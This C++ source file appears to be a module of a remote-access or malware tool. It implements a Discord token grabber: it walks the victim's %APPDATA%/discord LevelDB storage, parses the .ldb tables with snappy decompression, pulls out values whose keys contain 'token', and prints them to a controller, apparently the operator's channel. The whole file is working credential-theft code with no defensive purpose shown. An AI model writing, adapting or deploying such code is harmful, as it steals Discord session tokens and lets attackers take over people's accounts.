#include <filesystem>
#include <fstream>
#include <snappy.h>
#include <vector>
#include <iostream>
#include "util.h"
#include "controller.h"
#include "commands.h"

using namespace std;

string parseLDB(const string path) {
	ifstream file(path, ios::binary | ios::ate);
	if (!file) {
		return "";
	}
	size_t size = file.tellg();
	file.seekg(0, ios::beg);
	vector<char> bytes(size);
	file.read(bytes.data(), size);

	size_t offset = size - 48;
	int metaidxOffset = decodeVarint(&bytes[offset], &offset);
	int metaidxSize = decodeVarint(&bytes[offset], &offset);
	int idxOffset = decodeVarint(&bytes[offset], &offset);
	int idxSize = decodeVarint(&bytes[offset], &offset);

	string out;
	snappy::Uncompress(bytes.data() + idxOffset, idxSize, &out);
	vector<int> blockOffsets;
	vector<int> blockSizes;

	offset = 0;
	while (offset < out.size()) {
		int sharedBytes = decodeVarint<uint32_t>(&out[offset], &offset);
		int unsharedBytes = decodeVarint<uint32_t>(&out[offset], &offset);
		int valueLength = decodeVarint<uint32_t>(&out[offset], &offset);
		string keyDelta(out.begin() + offset, out.begin() + offset + unsharedBytes);
		offset += unsharedBytes;
		int blockOffset = decodeVarint(&out[offset], &offset);
		int blockSize = decodeVarint(&out[offset], &offset);

		blockOffsets.push_back(blockOffset);
		blockSizes.push_back(blockSize);
	}

	for (int i = 0; i < blockOffsets.size(); i++) {
		bool valid = snappy::Uncompress(bytes.data() + blockOffsets[i], blockSizes[i], &out);
		if (!valid) {
			continue;
		}
		offset = 0;
		string lastKey;
		while (offset < out.size()) {
			int sharedBytes = decodeVarint<uint32_t>(&out[offset], &offset);
			int unsharedBytes = decodeVarint<uint32_t>(&out[offset], &offset);
			int valueLength = decodeVarint<uint32_t>(&out[offset], &offset);
			string keyDelta(out.begin() + offset, out.begin() + offset + unsharedBytes);
			if (sharedBytes > 0) {
				keyDelta.insert(keyDelta.begin(), lastKey.begin(), lastKey.begin() + sharedBytes);
			}
			lastKey = keyDelta;
			offset += unsharedBytes;

			if (keyDelta.find("token") != string::npos && valueLength > 0) {
				string val(out.begin() + offset + 1, out.begin() + offset + valueLength);
				return val;
			}
			offset += valueLength;
		}
	}

	return "";
}

int discordCommand(Controller& ctrl, DiscordCommand cmd) {
	if (cmd == DiscordCommand::check) {
		string discordPath = getenv("APPDATA");
		discordPath += "/discord";
		return !(filesystem::exists(discordPath) &&
				 filesystem::is_directory(discordPath));
	} else if (cmd == DiscordCommand::grab) {
		string discordPath = getenv("APPDATA");
		discordPath += "/discord";
		if (!(filesystem::exists(discordPath) &&
			  filesystem::is_directory(discordPath))) {
			return -1;
		}
		try {
			discordPath += "/Local Storage/leveldb";
			bool gotToken = false;
			for (auto &p : filesystem::directory_iterator(discordPath)) {
				if (p.path().extension() == ".ldb") {
					string token = parseLDB(p.path().string());
					if (token.size() != 0) {
						gotToken = true;
						ctrl.println(token);
					}
				}
			}
			return !gotToken;
		} catch (filesystem::filesystem_error &ex) {
			ctrl.err_println(ex.what());
			return -2;
		}
	}

	return -3;
}
